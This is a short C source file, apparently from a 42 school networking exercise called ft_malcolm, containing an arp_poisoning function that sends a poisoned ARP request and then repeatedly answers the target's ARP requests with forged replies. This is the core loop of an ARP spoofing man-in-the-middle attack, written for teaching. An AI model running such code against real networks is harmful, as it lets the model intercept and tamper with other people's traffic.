/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   arp_poisoning.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lucocozz <lucocozz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/04/23 18:56:02 by lucocozz          #+#    #+#             */
/*   Updated: 2023/04/23 19:14:47 by lucocozz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

int	arp_poisoning(int sock, t_cli cli)
{
	struct ether_arp	packet = {0};

	if (send_arp(sock, cli, poisoned_arp_request) == -1)
		return (EXIT_FAILURE);
	while (true)
	{
		if (recv_arp_type_from_to(sock, &packet, ARPOP_REQUEST, cli.target_ip, cli.sender_ip) == -1)
			return (EXIT_FAILURE);
		if (g_running == false)
			break ;
		sleep(2);
		if (send_arp(sock, cli, arp_reply) == -1)
			return (EXIT_FAILURE);
	}
	return (EXIT_SUCCESS);
}
